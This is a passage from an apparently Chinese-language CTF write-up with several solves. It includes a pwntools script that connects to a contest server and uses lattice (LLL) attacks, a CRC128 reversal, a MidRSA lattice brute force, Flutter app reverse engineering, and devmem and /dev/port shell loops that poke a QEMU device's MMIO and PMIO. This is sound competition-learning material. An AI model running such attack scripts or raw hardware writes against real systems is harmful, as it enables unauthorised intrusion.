class="params">last_choas, idx, pos</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mapping</span>(<span class="params">x</span>):</span><br><span class="line">        <span class="keyword">if</span> x==<span class="string">&#x27;0&#x27;</span>: <span class="keyword">return</span> <span class="string">&quot;W&quot;</span></span><br><span class="line">        <span class="keyword">if</span> x==<span class="string">&#x27;1&#x27;</span>: <span class="keyword">return</span> <span class="string">&quot;S&quot;</span></span><br><span class="line">        <span class="keyword">if</span> x==<span class="string">&#x27;2&#x27;</span>: <span class="keyword">return</span> <span class="string">&quot;A&quot;</span></span><br><span class="line">        <span class="keyword">if</span> x==<span class="string">&#x27;3&#x27;</span>: <span class="keyword">return</span> <span class="string">&quot;D&quot;</span></span><br><span class="line"></span><br><span class="line">    target = (-last_choas-<span class="number">1</span>)*(idx-<span class="number">1</span>) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">128</span>)</span><br><span class="line">    moves = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> target:</span><br><span class="line">        moves = mapping(<span class="built_in">str</span>(target % <span class="number">4</span>)) + moves</span><br><span class="line">        target //= <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(moves) != <span class="number">64</span>:</span><br><span class="line">        moves = mapping(<span class="string">&quot;0&quot;</span>) * (<span class="number">64</span> - <span class="built_in">len</span>(moves)) + moves</span><br><span class="line">    <span class="comment"># print(f&quot;moves[:64] is &#123;moves[:64]&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">    current_pos = check_pos(moves)</span><br><span class="line">    <span class="comment"># print(f&quot;moves[:64] pos is &#123;current_pos&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">    sol_moves = solve_pos(current_pos, pos)</span><br><span class="line">    <span class="comment"># print(f&quot;moves[64:] is &#123;sol_moves&#125;&quot;)</span></span><br><span class="line">    moves = moves + sol_moves</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> moves</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_pos</span>(<span class="params">moves</span>):</span><br><span class="line">    col, row = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> move <span class="keyword">in</span> moves:</span><br><span class="line">        <span class="keyword">if</span> move == <span class="string">&quot;W&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> row &lt; <span class="number">15</span>: row += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> move == <span class="string">&quot;S&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> row &gt; <span class="number">0</span>: row -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> move == <span class="string">&quot;A&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> col &gt; <span class="number">0</span>: col -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> move == <span class="string">&quot;D&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> col &lt; <span class="number">15</span>: col += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(col, row)</span><br><span class="line">    <span class="keyword">return</span> [col, row]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pos</span>(<span class="params">current_pos, target_pos</span>):</span><br><span class="line">    x0, y0 = current_pos</span><br><span class="line">    x1, y1 = target_pos</span><br><span class="line"></span><br><span class="line">    sol = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> x0 &lt; x1:</span><br><span class="line">        sol += <span class="string">&quot;D&quot;</span> * (x1-x0)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sol += <span class="string">&quot;A&quot;</span> * (x0-x1)</span><br><span class="line">    <span class="keyword">if</span> y0 &lt; y1:</span><br><span class="line">        sol += <span class="string">&quot;W&quot;</span> * (y1-y0)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sol += <span class="string">&quot;S&quot;</span> * (y0-y1)</span><br><span class="line">    <span class="keyword">return</span> sol</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pq</span>(<span class="params">choas</span>):</span><br><span class="line">    L = matrix(ZZ, [[<span class="number">2</span>^<span class="number">128</span>, <span class="number">0</span>], [choas, <span class="number">1</span>]])</span><br><span class="line">    S = L.LLL()</span><br><span class="line">    len_1s = <span class="built_in">bin</span>(<span class="built_in">int</span>(S[<span class="number">0</span>][<span class="number">0</span>]))[<span class="number">2</span>:].count(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bin</span>(<span class="built_in">int</span>(S[<span class="number">0</span>][<span class="number">0</span>])))</span><br><span class="line">    <span class="built_in">print</span>(len_1s)</span><br><span class="line">    <span class="keyword">if</span> len_1s &gt; <span class="number">30</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&quot;too many 1s&quot;</span>)</span><br><span class="line">    v = L.solve_left(S[<span class="number">0</span>])</span><br><span class="line">    p, q = v[<span class="number">0</span>], v[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">abs</span>(p), <span class="built_in">abs</span>(q), len_1s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    freeze_support()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> tries <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        conn = remote(<span class="string">&quot;152.136.172.227&quot;</span>, <span class="number">22222</span>)</span><br><span class="line">        <span class="comment"># conn = remote(&quot;127.0.0.1&quot;, 22222)</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;tries&#125;</span>] proof of work...&quot;</span>)</span><br><span class="line">        proof_of_work(conn)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;tries&#125;</span>] proof of work done!&quot;</span>)</span><br><span class="line"></span><br><span class="line">        idx = <span class="number">0</span></span><br><span class="line">        fail = <span class="number">0</span></span><br><span class="line">        success = <span class="number">0</span></span><br><span class="line">        choas = -<span class="number">1</span></span><br><span class="line">        len_1s = <span class="literal">None</span></span><br><span class="line">        p, q = <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;tries&#125;</span>] tries...&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> idx &lt; <span class="number">256</span>:</span><br><span class="line">                idx += <span class="number">1</span></span><br><span class="line">                conn.recvuntil(<span class="string">b&quot;i am at &quot;</span>)</span><br><span class="line">                line = conn.recvline().strip().decode()</span><br><span class="line">                x1, y1 = line.split(<span class="string">&quot;]&quot;</span>)[<span class="number">0</span>].split(<span class="string">&quot;[&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">                x1, y1 = <span class="built_in">int</span>(x1), <span class="built_in">int</span>(y1)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;idx&#125;</span>] target pos: [<span class="subst">&#123;x1&#125;</span>, <span class="subst">&#123;y1&#125;</span>]&quot;</span>)</span><br><span class="line"></span><br><span class="line">                moves = solve_choas(choas, idx, [x1, y1])</span><br><span class="line">                conn.sendlineafter(<span class="string">b&quot;Your moves: &quot;</span>, moves.encode())</span><br><span class="line"></span><br><span class="line">                conn.recvuntil(<span class="string">b&quot;choas: &quot;</span>)</span><br><span class="line">                choas = <span class="built_in">int</span>(conn.recvline().strip().decode())</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;idx&#125;</span>] choas: <span class="subst">&#123;choas&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> p <span class="keyword">and</span> <span class="keyword">not</span> q:</span><br><span class="line">                    p, q, len_1s = solve_pq(choas)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># if fail &lt; 28:</span></span><br><span class="line">                <span class="comment">#     conn.sendlineafter(b&quot;(e.g.: 1,1):&quot;, f&quot;&#123;18446744073709551615&#125;, &#123;1&#125;&quot;.encode())</span></span><br><span class="line">                <span class="comment"># else:</span></span><br><span class="line">                conn.sendlineafter(<span class="string">b&quot;(e.g.: 1,1):&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;p&#125;</span>, <span class="subst">&#123;q&#125;</span>&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line">                res = conn.recvline().strip().decode()</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;sorry&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">                    fail += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    success += <span class="number">1</span></span><br><span class="line">                score = conn.recvline().strip().decode()</span><br><span class="line">                <span class="built_in">print</span>(score)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;count(&#x27;1&#x27;): <span class="subst">&#123;len_1s&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            conn.interactive()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            conn.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3><span id="crcrc">CRCRC</span><a href="#crcrc" class="header-anchor"></a></h3><p>在crc128中有一个初始值，经过调试可以得到头尾固定时的状态转移过程</p>
<p><strong>$$state_1-&gt;state_2-&gt;state_3-&gt;state_4$$</strong></p>
<p>由1到2是前一段base64可得，由4-&gt;3反推可以使用上面的re_crc128函数</p>
<p>所以最终要解决就是已知状态2和状态3，求一个在base64表中的的data值</p>
<p><strong>$$crc(\Delta \oplus a)\oplus crc(\Delta \oplus  b) &#x3D; \textrm{const}\quad  \forall \Delta$$</strong></p>
<p>由这个式子可以转换成mod2加法，由于需要可见字符，所以考虑更多bytes的data，测试考虑30位的data，这样base64decode可以满足flag条件</p>
<p>如何对于矩阵来说</p>
<p>则矩阵形式为128*（30*8）<em>X&#x3D;128</em>1</p>
<p>所以可以固定24<em>3&lt;30</em>8-128位，直接固定每个字符前3位为010，在再解空间爆破</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">crc128</span>(<span class="params">data, poly=<span class="number">0x883ddfe55bba9af41f47bd6e0b0d8f8f</span></span>):</span><br><span class="line">    crc = <span class="number">0x9aefa6cb65b524cf97abaa31b3c757e3</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">        crc ^^= b</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            crc = (crc &gt;&gt; <span class="number">1</span>) ^^ (poly &amp; -(crc &amp; <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> crc ^^ ((<span class="number">1</span> &lt;&lt; <span class="number">128</span>) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">equivalent_affine_crc</span>(<span class="params">crc = crc128, crc_bits = <span class="number">128</span>, target_bytes = <span class="number">30</span></span>):</span><br><span class="line">    zero_crc = crc(target_bytes*<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    target_bits = <span class="number">8</span> * target_bytes</span><br><span class="line">    v2n = <span class="keyword">lambda</span> v: <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, v)), <span class="number">2</span>)</span><br><span class="line">    n2v = <span class="keyword">lambda</span> n: vector(GF(<span class="number">2</span>), <span class="built_in">bin</span>(n)[<span class="number">2</span>:].zfill(crc_bits))</span><br><span class="line">    <span class="comment"># n2v_t = lambda n: vector(GF(2), bin(n)[2:].zfill(target_bits))</span></span><br><span class="line">    Affine_Matrix = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(target_bits):</span><br><span class="line">        v = vector(GF(<span class="number">2</span>), (j == i <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(target_bits)))</span><br><span class="line">        value = crc(long_to_bytes(v2n(v),target_bytes)) ^^ zero_crc</span><br><span class="line">        Affine_Matrix.append(n2v(value))</span><br><span class="line">    Affine_Matrix=matrix(GF(<span class="number">2</span>),Affine_Matrix).transpose()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(target_bytes):</span><br><span class="line">        v,w,k = [<span class="number">0</span>]*target_bits,[<span class="number">0</span>]*target_bits,[<span class="number">0</span>]*target_bits</span><br><span class="line">        v[i*<span class="number">8</span>],w[i*<span class="number">8</span>+<span class="number">1</span>],k[i*<span class="number">8</span>+<span class="number">2</span>]=<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span></span><br><span class="line">        v = vector(GF(<span class="number">2</span>), v)</span><br><span class="line">        w = vector(GF(<span class="number">2</span>), w)</span><br><span class="line">        k = vector(GF(<span class="number">2</span>), k)</span><br><span class="line">        Affine_Matrix = Affine_Matrix.stack(v)</span><br><span class="line">        Affine_Matrix = Affine_Matrix.stack(w)</span><br><span class="line">        Affine_Matrix = Affine_Matrix.stack(k)</span><br><span class="line">    <span class="comment"># crc affine function: crc_128(x) = M*x+ C</span></span><br><span class="line">    <span class="keyword">return</span> Affine_Matrix, n2v(zero_crc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crc_128_reverse</span>(<span class="params">crc_value</span>):</span><br><span class="line">    M , C = equivalent_affine_crc()</span><br><span class="line">    <span class="comment"># crc affine function: crc_128(x) = M*x+ C</span></span><br><span class="line">    v2n = <span class="keyword">lambda</span> v: <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, v)), <span class="number">2</span>)</span><br><span class="line">    n2v = <span class="keyword">lambda</span> n: vector(GF(<span class="number">2</span>), <span class="built_in">bin</span>(n)[<span class="number">2</span>:].zfill(<span class="number">128</span>))</span><br><span class="line">    temp = n2v(crc_value)+C</span><br><span class="line">    temp = vector(GF(<span class="number">2</span>),<span class="built_in">list</span>(temp)+[<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>]*<span class="number">30</span>)</span><br><span class="line">    <span class="built_in">print</span>(M.ncols(),M.nrows(),<span class="built_in">len</span>(temp))</span><br><span class="line">    res = M.solve_right(temp)</span><br><span class="line">    bas = M.right_kernel()</span><br><span class="line">    K = <span class="built_in">len</span>(bas.basis())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>&lt;&lt;K):</span><br><span class="line">        tr = res+bas[i]</span><br><span class="line">        s = long_to_bytes(v2n(tr))</span><br><span class="line"><span class="comment">#         print(s)</span></span><br><span class="line">        <span class="keyword">if</span> re.fullmatch(<span class="string">b&#x27;[A-Za-z0-9+/]*=&#123;0,2&#125;&#x27;</span>, s):</span><br><span class="line">            <span class="built_in">print</span>(s)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#     return long_to_bytes(v2n(res))</span></span><br><span class="line">crc_128_reverse(<span class="number">0x1bff942435a8f7d5b2f76fc4735f168b</span> ^^ ((<span class="number">1</span> &lt;&lt; <span class="number">128</span>) - <span class="number">1</span>))</span><br><span class="line"><span class="comment">#HTSUZATLBQWGHRQPUFXZVYBPLCPOMB</span></span><br><span class="line"><span class="comment">#得到RGVhciBndWVzdCwgd2VsY29tZSB0byBDUkNSQyBNYWdpYyBIb3VzZSwgSWYgeW91IGlucHV0IAHTSUZATLBQWGHRQPUFXZVYBPLCPOMBLCB5b3Ugd2lsbCBnZXQgMHg5YzZhMTFmYmMwZTk3YjFmZmY1ODQ0ZmE4OGIxZWUyZA==</span></span><br></pre></td></tr></table></figure>

<h3><span id="midrsa">MidRSA</span><a href="#midrsa" class="header-anchor"></a></h3><p><strong>$$E<em>D-k_1</em>n_1&#x3D;A\E<em>D-a</em>n_2&#x3D;B\E<em>D-d</em>n_3&#x3D;C$$</strong></p>
<p>存在这三个等式关系，其中D，A，B，C均为小于E的较小数.</p>
<p>这里相比于上面卡了4-6bits的界，所以爆破一下高位就行</p>
<p><em><em>$$E</em>(h_d+d_0)-k_1*n_1&#x3D;h_a+A_0\E</em>(h_d+d_0)-a<em>n_2&#x3D;h_b+B_0\E</em>(h_d+d_0)-d<em>n_3&#x3D;h_c+C_0$$</em>*</p>
<p>展开造一个类似的格，然后爆破就ok，时间上也是几分钟</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">70000</span>,<span class="number">2</span>^<span class="number">20</span>)):</span><br><span class="line">    t1 = <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">21</span>)</span><br><span class="line">    h = <span class="built_in">int</span>(<span class="string">&#x27;1&#x27;</span>+t1[:<span class="number">3</span>],<span class="number">2</span>) &lt;&lt; <span class="number">0x23c</span></span><br><span class="line">    h1 = <span class="built_in">int</span>(t1[<span class="number">3</span>:<span class="number">9</span>],<span class="number">2</span>) &lt;&lt; <span class="number">1338</span></span><br><span class="line">    h2 = <span class="built_in">int</span>(t1[<span class="number">9</span>:<span class="number">15</span>],<span class="number">2</span>) &lt;&lt; <span class="number">1338</span></span><br><span class="line">    h3 = <span class="built_in">int</span>(t1[<span class="number">15</span>:<span class="number">21</span>],<span class="number">2</span>) &lt;&lt; <span class="number">1338</span></span><br><span class="line">    M = Matrix(QQ,[[-e,-e,-e,<span class="number">2</span>^<span class="number">766</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">                   [n1,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">                   [<span class="number">0</span>,n2,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">                   [<span class="number">0</span>,<span class="number">0</span>,n3,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">                   [-h*e,-h*e,-h*e,<span class="number">0</span>,<span class="number">2</span>^(<span class="number">1338</span>),<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">                   [-h1,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">1338</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">                   [<span class="number">0</span>,-h2,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">1338</span>,<span class="number">0</span>],</span><br><span class="line">                   [<span class="number">0</span>,<span class="number">0</span>,-h3,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">1338</span>]])</span><br><span class="line">    <span class="comment"># e_*d_-k1*n1,n1</span></span><br><span class="line">    res = M.LLL()</span><br><span class="line">    d = <span class="built_in">int</span>(res[<span class="number">0</span>][<span class="number">3</span>]//<span class="number">2</span>^<span class="number">766</span>) + h</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;ACTF&#x27;</span> <span class="keyword">in</span> long_to_bytes(ZZ(<span class="built_in">pow</span>(c,d,n1))):</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(ZZ(<span class="built_in">pow</span>(c,d,n1))))</span><br></pre></td></tr></table></figure>

<h1><span id="rev">Rev</span><a href="#rev" class="header-anchor"></a></h1><h3><span id="native-app"><strong>native app ​</strong></span><a href="#native-app" class="header-anchor"></a></h3><p>flutter题，用<a href="https://github.com/worawit/blutter">https://github.com/worawit/blutter</a> 分析libapp.so可以解出dart代码及偏移量</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[closure] void _onChanged(dynamic, String) &#123;</span><br><span class="line">  // ** addr: <span class="number">0x1e0588</span>, size: -<span class="number">0x1</span></span><br><span class="line">&#125;</span><br><span class="line">[closure] void _onSubmit(dynamic, String) &#123;</span><br><span class="line">  // ** addr: <span class="number">0x1e03c4</span>, size: -<span class="number">0x1</span></span><br><span class="line">&#125;</span><br><span class="line">[closure] void _onLongPressed(dynamic) &#123;</span><br><span class="line">  // ** addr: <span class="number">0x1deba8</span>, size: -<span class="number">0x1</span></span><br><span class="line">&#125;</span><br><span class="line">[closure] void _onTap(dynamic) &#123;</span><br><span class="line">  // ** addr: <span class="number">0x1de4b8</span>, size: -<span class="number">0x1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中_onChanged对应将输入框内容同步到文本框，_onSubmit对应输入法确认按钮在文本框对应提交操作，_onTap和_onLongPressed分别对应提交按钮的点击和长按。</p>
<p>经测试发现操作序列为提交、点按、长按。提交和点按分别对应State里两个String成员字段的赋值，之后按钮长按事件最为可疑，其中调用函数为sub_1DEBF0()，观察其函数内部的流程图，将StackOverflowSharedWithoutFPUR()视为异常分支，可以理解该函数主体为一循环。</p>
<p><img src="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=MDQzYjc4OGNjZDUwMDFiNGYxYmNkYzUwOTdkMTQ3ZjJfM1o0dWZaRWM1dWtKcm5ibGlPZHBvMzFyV2Znd1VvcU9fVG9rZW46SGNEbWJBaGRIb1JoeTN4b3JrMWNCempwbnNqXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA">​</p>
<p>输入”abc”，ida断点在0x1DEC60观察边界条件，可发现w0是0x44，w1是0x06，其中w0是预期字符串长度，w1是当前字符长度，结合Dart的SMI整数表示特点，预期的字符串长度实际为0x44&#x2F;2&#x3D;0x22即34个字符。</p>
<p><img src="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjJmOTIyZWUyN2U5OWJkYjZkZTY4MGJlZWRkYzBlZjVfM3BkSXBpSlJNUGViREhkMUhhNkZSR0k4RG9MOE5OOVJfVG9rZW46SFBRSmJYZEtob0xaRTJ4Y2Fya2MzbHVZbnZoXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA">​</p>
<p>输入34个随机字符（大小写字母+数字）继续测试发现该循环对字符串进行了逐字符比较，在界面上输出false或true。并且每个字符被映射到的字节值和字符所在位置有关，构造映射表不可行。尝试若干字符后，发现映射前后大致存在线性关系，存在二分法加速暴力枚举的可能性。故通过断点在单个字符判断条件上暴力得到flag：Iu2xpwXLAK734btEt9kXIhfpRgTlu6KuI0</p>
<h3><span id="qemu-playground-1">qemu-playground-1</span><a href="#qemu-playground-1" class="header-anchor"></a></h3><p>要调内核吗，没看懂什么意思</p>
<p><img src="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=OGYzYTMzOTAwOTMzODY3MTIzMWFkNGEzMjE2YWFiMzlfTHBqVGxFM0lsZFdjMkJrTmE2bGdISGRDOWZVVjJGSW9fVG9rZW46TUxNcmJDUnhIb3VMUm54OU5VMGNZMGdhbm5mXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA">​</p>
<p>怎么感觉下面这个是加密函数</p>
<p><img src="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=NzE5N2JhM2QxZDRkMTcxZjQxZDJkNjExZDFkNjIxZjlfMkt1VEhaNFRjWmtSanJscVRkRFE5OUxqaDgxdXJWOWhfVG9rZW46UDhyVGJjNTNLb1NxSjl4T3BMemNXb0RlbmVjXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA">​</p>
<p>一些shell读写mmio、pmio技巧：</p>
<ul>
<li><p>查看设备mmio、pmio地址范围：<code>cat /sys/devices/pci0000:00/0000:00:04.0/device</code>​</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x00000000febf1000 0x00000000febf1fff 0x0000000000040200</span><br><span class="line">0x000000000000c040 0x000000000000c05f 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>

<ul>
<li>第一行是mmio，地址从0x00000000febf1000到0x00000000febf1fff，4096bytes但似乎qemu代码里显示只能访问64bytes</li>
<li>第二行是pmio，地址从0x000000000000c040到0x000000000000c05f，可访问0x20bytes</li>
</ul>
</li>
<li><p>访问mmio，注意你的地址可能和我的地址不一样</p>
<ul>
<li>将mmio全部16*4bytes写0</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">START_ADDRESS=0xfebf1000</span><br><span class="line">NUM_WORDS=16</span><br><span class="line">i=0</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$i</span> -lt <span class="variable">$NUM_WORDS</span> ]; <span class="keyword">do</span></span><br><span class="line">    ADDRESS=$((START_ADDRESS + i * <span class="number">4</span>))</span><br><span class="line">    devmem <span class="variable">$ADDRESS</span> 32 0 <span class="comment"># 这里0是要写入的值</span></span><br><span class="line">    i=$((i + <span class="number">1</span>))</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<ul>
<li>读mmio</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">START_ADDRESS=0xfebf1000</span><br><span class="line">NUM_WORDS=16</span><br><span class="line">i=0</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$i</span> -lt <span class="variable">$NUM_WORDS</span> ]; <span class="keyword">do</span></span><br><span class="line">    ADDRESS=$((START_ADDRESS + i * <span class="number">4</span>))</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;Address: 0x%08x, Value: 0x%04x\n&quot;</span> <span class="variable">$ADDRESS</span> $(devmem <span class="variable">$ADDRESS</span> 32)</span><br><span class="line">    i=$((i + <span class="number">1</span>))</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure></li>
<li><p>访问pmio</p>
<ul>
<li><p>读pmio地址空间里，0x0000c04及以后的内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd /dev/port | grep -A 10 <span class="string">&quot;0000c04&quot;</span> </span><br></pre></td></tr></table></figure></li>
<li><p>写特定地址，下面是往pmio空间内偏移为0x1的地址写了一个0x1，从代码里看，往0x1这里写值会触发他的worker thread</p>
